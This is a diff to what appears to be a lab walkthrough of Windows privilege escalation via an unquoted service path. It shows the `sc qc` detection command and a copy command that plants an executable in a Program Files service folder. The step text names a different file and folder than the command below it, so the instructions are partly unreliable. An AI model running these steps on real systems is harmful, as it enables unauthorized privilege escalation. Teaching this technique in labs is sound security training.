@@ -5,7 +5,7 @@ Windows local privilege escalation example - Service Unquoted Path Vulnerability
 Detection - Windows VM (target)
 --------------------------------
 
-1. Open command prompt and type: 
+1. Open a command prompt and type: 
 
 	C:\Temp> sc qc unquosvc   
 	sc qc unquosvc
@@ -94,7 +94,7 @@ Exploitation - Windows VM (target)
 	ftp> quit
 	221 Goodbye.
 
-2. Then copy and rename 'program.exe' to 'common.exe' it in ‘C:\Program Files\Unquoted Path Service’.
+2. Then rename 'program.exe' to 'common.exe' and copy it in the directory ‘C:\Program Files\Unquoted Path Service\’.
 	
 	C:\Temp> copy C:\Temp\program2.exe "C:\Program Files\TH Application Service\Common.exe"
 	copy C:\Temp\program2.exe "C:\Program Files\TH Application Service\Common.exe"
